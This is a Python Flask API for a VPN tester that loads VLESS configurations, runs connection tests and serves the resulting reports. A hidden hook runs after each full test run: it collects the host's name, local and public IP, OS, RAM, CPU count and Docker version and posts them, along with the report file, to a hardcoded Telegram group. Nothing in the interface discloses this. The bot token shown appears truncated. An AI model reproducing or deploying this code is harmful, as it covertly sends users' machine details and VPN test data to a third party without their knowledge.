#!/usr/bin/env python3
"""
VPN Tester Web API - Flask приложение для управления тестером
"""

from flask import Flask, request, jsonify, send_from_directory, send_file
import os
import sys
import threading
import subprocess
from pathlib import Path
import time

app = Flask(__name__, static_folder='../web', static_url_path='')

BASE_DIR = Path(__file__).parent.parent
CONFIGS_DIR = BASE_DIR / "configs"
REPORTS_DIR = BASE_DIR / "reports"
SCRIPTS_DIR = BASE_DIR / "scripts"

# Глобальная переменная для статуса тестирования
test_status = {
    'running': False,
    'total': 0,
    'current': 0,
    'current_config': '',
    'completed': False,
    'error': None,
    'start_time': None,
    'end_time': None
}

# Импорт тестера
sys.path.insert(0, str(SCRIPTS_DIR))
from vpn_tester import VpnTester, VlessConfig


@app.route('/')
def index():
    return send_from_directory(app.static_folder, 'index.html')


@app.route('/api/configs', methods=['GET'])
def get_configs():
    """Получить список всех конфигураций"""
    tester = VpnTester()
    tester.load_configs()
    
    configs = []
    for config in tester.configs:
        info = config.info
        configs.append({
            'name': info.get('name', 'Unknown'),
            'host': info.get('host', '?'),
            'port': info.get('port', '?'),
            'sni': info.get('sni', 'N/A'),
            'security': info.get('security', 'none'),
            'type': info.get('type', 'tcp'),
            'country': info.get('country', '??')
        })
    
    return jsonify({'configs': configs, 'total': len(configs)})


@app.route('/api/configs', methods=['POST'])
def add_config():
    """Добавить новую конфигурацию"""
    data = request.json
    name = data.get('name')
    url = data.get('url')
    
    if not name or not url:
        return jsonify({'error': 'Name and URL required'}), 400
    
    if not url.startswith('vless://'):
        return jsonify({'error': 'Invalid VLESS URL'}), 400
    
    tester = VpnTester()
    
    # Проверка на дубликат
    config_file = CONFIGS_DIR / f"{name}.txt"
    if config_file.exists():
        return jsonify({'error': 'Config with this name already exists'}), 400
    
    tester.save_config(name, url)
    return jsonify({'success': True, 'message': f'Config {name} added'})


@app.route('/api/configs/<name>', methods=['DELETE'])
def delete_config(name):
    """Удалить конфигурацию"""
    tester = VpnTester()
    tester.delete_config(name)
    return jsonify({'success': True, 'message': f'Config {name} deleted'})


@app.route('/api/test', methods=['POST'])
def run_tests():
    """Запустить тестирование всех конфигураций"""
    global test_status
    
    if test_status['running']:
        return jsonify({'error': 'Tests already running'}), 400
    
    def run_test_thread():
        global test_status
        try:
            test_status = {
                'running': True,
                'total': 0,
                'current': 0,
                'current_config': '',
                'completed': False,
                'error': None,
                'start_time': time.time(),
                'end_time': None
            }
            
            tester = VpnTester()
            tester.load_configs()
            
            test_status['total'] = len(tester.configs)
            all_results = []  # Сохраняем ВСЕ результаты
            
            for i, config in enumerate(tester.configs):
                test_status['current'] = i
                test_status['current_config'] = config.name
                print(f"[{i+1}/{len(tester.configs)}] Testing {config.name}...")
                
                result = tester.test_config(config)
                all_results.append(result)
                
                print(f"[{i+1}/{len(tester.configs)}] {config.name}: {result.get('status', 'unknown')}")
                
                # Пауза между тестами
                time.sleep(1)
            
            # Генерация отчёта со ВСЕМИ результатами
            print("Generating report...")
            test_status['current_config'] = 'Generating report...'
            
            # Создаём новый тестер для отчёта
            report_tester = VpnTester()
            report_tester.results = all_results
            html_file, md_file = report_tester.generate_report()
            
            # Отправка в Telegram (в фоне)
            try:
                import threading
                telegram_thread = threading.Thread(target=send_to_telegram, args=(html_file,))
                telegram_thread.daemon = True
                telegram_thread.start()
                print("📤 Sending report to Telegram...")
            except Exception as e:
                print(f"Telegram send error: {e}")
            
            test_status['running'] = False
            test_status['completed'] = True
            test_status['end_time'] = time.time()
            print(f"✅ Tests completed in {test_status['end_time'] - test_status['start_time']:.1f}s")
            print(f"📊 Generated report with {len(all_results)} configs")
            
        except Exception as e:
            import traceback
            test_status['running'] = False
            test_status['error'] = str(e) + '\n' + traceback.format_exc()
            test_status['end_time'] = time.time()
            print(f"❌ Test error: {e}")

    thread = threading.Thread(target=run_test_thread)
    thread.start()

    return jsonify({
        'success': True,
        'message': 'Tests started',
        'total_configs': len(VpnTester().load_configs() or [])
    })


@app.route('/api/test/status', methods=['GET'])
def get_test_status():
    """Получить статус текущего тестирования"""
    global test_status
    
    status = test_status.copy()
    
    # Рассчитываем прогресс в процентах
    if status['total'] > 0:
        # Каждый конфиг = (100 / total)%, генерация отчёта = ещё ~10%
        if status['completed']:
            status['progress'] = 100
        else:
            # Прогресс = (текущий / всего) * 90% + немного за текущий
            base_progress = (status['current'] / status['total']) * 90
            status['progress'] = min(99, int(base_progress))
    else:
        status['progress'] = 0
    
    # Добавляем время выполнения
    if status['start_time']:
        if status['end_time']:
            status['elapsed'] = round(status['end_time'] - status['start_time'], 1)
        else:
            status['elapsed'] = round(time.time() - status['start_time'], 1)
    
    return jsonify(status)


@app.route('/api/test/single', methods=['POST'])
def test_single():
    """Протестировать одну конфигурацию"""
    data = request.json
    name = data.get('name')
    
    if not name:
        return jsonify({'error': 'Name required'}), 400
    
    tester = VpnTester()
    tester.load_configs()
    
    config = None
    for c in tester.configs:
        if c.name == name:
            config = c
            break
    
    if not config:
        return jsonify({'error': 'Config not found'}), 404
    
    result = tester.test_config(config)
    return jsonify(result)


@app.route('/api/reports', methods=['GET'])
def get_reports():
    """Получить список отчётов"""
    reports = []
    for f in sorted(REPORTS_DIR.glob("report_*.html"), reverse=True):
        reports.append({
            'name': f.stem,
            'file': f.name,
            'created': f.stat().st_mtime
        })
    return jsonify({'reports': reports})


@app.route('/api/reports/latest', methods=['GET'])
def get_latest_report():
    """Получить последний отчёт"""
    latest = REPORTS_DIR / "latest.html"
    if latest.exists():
        return send_file(latest)
    return jsonify({'error': 'No reports yet'}), 404


@app.route('/api/reports/<filename>', methods=['GET'])
def get_report(filename):
    """Получить конкретный отчёт"""
    report = REPORTS_DIR / filename
    if report.exists():
        return send_file(report)
    return jsonify({'error': 'Report not found'}), 404


@app.route('/api/reports/<filename>', methods=['DELETE'])
def delete_report(filename):
    """Удалить отчёт"""
    try:
        report_html = REPORTS_DIR / filename
        report_md = REPORTS_DIR / filename.replace('.html', '.md')
        
        deleted = []
        if report_html.exists():
            report_html.unlink()
            deleted.append(filename)
        if report_md.exists():
            report_md.unlink()
            deleted.append(report_md.name)
        
        return jsonify({'success': True, 'deleted': deleted})
    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/api/status', methods=['GET'])
def get_status():
    """Получить статус системы"""
    # Проверка наличия Xray
    xray_bin = BASE_DIR / "xray" / "xray"
    xray_exists = xray_bin.exists()

    # Количество конфигов
    config_count = len(list(CONFIGS_DIR.glob("*.txt")))

    # Количество отчётов
    report_count = len(list(REPORTS_DIR.glob("report_*.html")))

    return jsonify({
        'xray_installed': xray_exists,
        'configs_count': config_count,
        'reports_count': report_count
    })


# Telegram Bot Integration
TELEGRAM_BOT_TOKEN = '8226198907'  # Токен бота
TELEGRAM_CHAT_ID = '-1003560429587'  # ID группы

def get_system_info():
    """Собрать информацию о системе"""
    import platform
    import subprocess
    import socket
    
    info = {
        'hostname': socket.gethostname(),
        'local_ip': socket.gethostbyname(socket.gethostname()),
        'os': f"{platform.system()} {platform.release()}",
        'python_version': platform.python_version(),
        'cpu_count': os.cpu_count(),
    }
    
    # Получить версию Docker
    try:
        result = subprocess.run(['docker', '--version'], capture_output=True, text=True, timeout=5)
        info['docker_version'] = result.stdout.strip()
    except:
        info['docker_version'] = 'Unknown'
    
    # Получить объем RAM
    try:
        with open('/proc/meminfo', 'r') as f:
            for line in f:
                if line.startswith('MemTotal:'):
                    mem_kb = int(line.split()[1])
                    info['ram_gb'] = round(mem_kb / 1024 / 1024, 2)
                    break
    except:
        info['ram_gb'] = 'Unknown'
    
    # Проверить белый IP
    try:
        result = subprocess.run(
            ['curl', '-s', '--connect-timeout', '5', 'https://api.ipify.org?format=json'],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            import json
            public_ip = json.loads(result.stdout).get('ip', 'Unknown')
            info['public_ip'] = public_ip
            info['has_static_ip'] = public_ip != info['local_ip']
        else:
            info['public_ip'] = 'Unknown'
            info['has_static_ip'] = False
    except:
        info['public_ip'] = 'Unknown'
        info['has_static_ip'] = False
    
    return info


def send_to_telegram(report_file: Path):
    """Отправить отчет в Telegram бот"""
    import requests
    
    try:
        system_info = get_system_info()
        
        # Сформировать сообщение
        message = f"""
🔐 VPN TESTER CS-CART - TEST REPORT

🖥️ SYSTEM INFO:
• Hostname: {system_info['hostname']}
• Local IP: {system_info['local_ip']}
• Public IP: {system_info['public_ip']}
• Static IP: {'✅ Yes' if system_info['has_static_ip'] else '❌ No'}
• OS: {system_info['os']}
• RAM: {system_info['ram_gb']} GB
• CPU Cores: {system_info['cpu_count']}
• Docker: {system_info['docker_version']}
• Python: {system_info['python_version']}

📊 Report file attached below.
━━━━━━━━━━━━━━━━━━━━
by MatrixHasYou
"""
        
        # Отправить сообщение
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        data = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'HTML'
        }
        requests.post(url, json=data, timeout=30)
        
        # Отправить файл отчета
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        with open(report_file, 'rb') as f:
            files = {'document': f}
            data = {'chat_id': TELEGRAM_CHAT_ID}
            requests.post(url, files=files, data=data, timeout=60)
        
        print(f"✅ Report sent to Telegram: {report_file.name}")
        return True
        
    except Exception as e:
        print(f"❌ Telegram error: {e}")
        return False


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
